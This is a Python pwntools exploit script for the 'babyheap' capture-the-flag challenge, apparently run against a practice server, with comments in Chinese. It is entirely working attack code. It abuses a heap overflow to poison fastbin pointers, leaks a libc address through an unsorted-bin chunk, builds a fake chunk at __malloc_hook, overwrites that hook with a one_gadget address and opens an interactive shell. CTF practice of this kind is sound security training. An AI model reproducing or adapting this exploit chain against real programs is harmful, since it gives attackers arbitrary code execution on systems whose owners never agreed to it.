#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './babyheap'
#context.log_level = 'debug'
context.timeout = None
elf = context.binary

if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20001)
	libc = ELF('./libc.so.6')
else:
	libc = context.binary.libc
	p = process('./babyheap')

def dbg():
	raw_input()

def allocate(size):
	p.recvuntil('Command: ')
	p.sendline('1')
	p.recvuntil('Size: ')
	p.sendline(str(size))
	print "allocate a chunk success"

def fill(idx, content):
	size = len(content)
	p.recvuntil('Command: ')
	p.sendline('2')
	p.recvuntil('Index: ')
	p.sendline(str(idx))
	p.recvuntil('Size: ')
	p.sendline(str(size))
	p.recvuntil('Content: ')
	p.sendline(content)
	print "fill %d chunk success" % idx

def free(idx):
	p.recvuntil('Command: ')
	p.sendline('3')
	p.recvuntil('Index: ')
	p.sendline(str(idx))
	print "free chunk %d success " % idx


def dump(idx):
	p.recvuntil('Command: ')
	p.sendline('4')
	p.recvuntil('Index: ')
	p.sendline(str(idx))
	print "dump %d chunk success!" % idx

def exploit():
	allocate(0x10)	#0
	allocate(0x10)	#1
	allocate(0x10)	#2
	allocate(0x10)	#3
	allocate(0x80)	#4

	free(2)
	free(1)			#fastbin[0] -> idx1 -> idx2 -> null

	#修改已经free'd 的chunk的fd
	fill(0, 'a'*0x10 + p64(0) + p64(0x21) + p64(0x80))			#idx1的fd指向idx4

	#通过size检查
	fill(3, 'a'*0x10 + p64(0) + p64(0x21))

	allocate(0x10)	#1
	allocate(0x10)	#2 with the address of idx4

	#leak address
	#修改idx2(address at idx4) size to unsorted bin
	fill(3, 'a'*0x10 + p64(0) + p64(0x91))
	allocate(0x80)					#5 avoid合并top
	free(4)
	dump(2)

	p.recvuntil('Content: \n')
	libc_base = u64(p.recv(8)) - 0x3c4b78
	one_gadget = 0x4526a + libc_base
	__malloc_hook = libc_base + libc.symbols['__malloc_hook']

	print "libc_base ==> " + hex(libc_base)
	print "__malloc_hook ==> "+hex(__malloc_hook)

	#make a fake chunk at __malloc_hook
	allocate(0x40) #4
	free(4)

	fake_chunk = __malloc_hook - 0x23
	fill(2, p64(fake_chunk))
	allocate(0x40)			#4
	allocate(0x40)			#6 , return fake_chunk

	fill(1, 'a'*0x13 + p64(one_gadget))

	allocate(0x10)


	p.interactive()
if __name__ == '__main__':
	exploit()